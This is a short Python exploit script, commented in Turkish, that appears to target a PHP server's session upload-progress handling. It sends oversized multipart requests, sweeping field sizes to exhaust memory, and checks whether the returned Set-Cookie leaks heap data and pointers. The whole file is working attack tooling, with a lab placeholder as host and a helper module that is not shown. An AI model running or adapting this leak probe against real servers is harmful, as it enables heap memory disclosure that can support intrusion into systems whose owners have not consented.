#!/usr/bin/env python3
"""SIMPLE brute force — tek parametre, tek istek, en basit sinyal.

Karmasik eness/9bie zinciri yerine:
  * TEK OOM istegi (field size vary)
  * AYRI leak read YOK — OOM isteginin KENDISININ Set-Cookie'sine bak
  * Sinyal: Set-Cookie decoded length (32B=clean, >32B=heap leak)

Hizli iterasyon icin her adim <1s.

Usage:
  python3 bf_simple.py --port 18113 --sizes 1,2,4,8,16,32,64,128,256
"""
from __future__ import annotations
import argparse
import time

from common import (Target, build_multipart, parse_cookie,
                    count_heap_pointers, extract_cookie_line)


def fire_oom(t: Target, size_mb: int, boundary: bytes) -> tuple[int, bytes]:
    """Tek OOM istegi: 1 buyuk field. Set-Cookie'yi dondur."""
    parts = [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "big", "data": b"B" * (size_mb * 1024 * 1024)},
    ]
    body = build_multipart(parts, boundary)
    return t.post_chunked(body, boundary, read_cap=1 << 20)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="LAB_IP")
    ap.add_argument("--port", type=int, default=18113)
    ap.add_argument("--sizes", default="1,2,4,8,16,32,64,128,256",
                    help="comma-separated field sizes in MB")
    args = ap.parse_args()

    t = Target(args.host, args.port, verbose=False)
    bnd = b"S" * 17
    sizes = [int(s) for s in args.sizes.split(",")]

    print(f"{'MB':>5} | {'st':>4} | {'cookie':>8} | {'2MBbase':>10} | {'cnt':>4} | signal",
          flush=True)
    print("-" * 60, flush=True)

    for size in sizes:
        st, raw = fire_oom(t, size, bnd)
        cookie = parse_cookie(raw)
        clen = len(cookie)
        base, cnt = count_heap_pointers(cookie, ~0x1FFFFF)
        # signal: 32B=clean, >32B=heap leak
        signal = "LEAK!" if (clen > 100 and cnt >= 8) else ("big" if clen > 100 else "clean")
        print(f"{size:>5} | {st:>4} | {clen:>7}B | 0x{base:08x} | {cnt:>4} | {signal}",
              flush=True)
        time.sleep(0.3)

    print("-" * 60, flush=True)
    print("Done. LEAK! = heap data in Set-Cookie. clean = 32B session ID.", flush=True)
    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
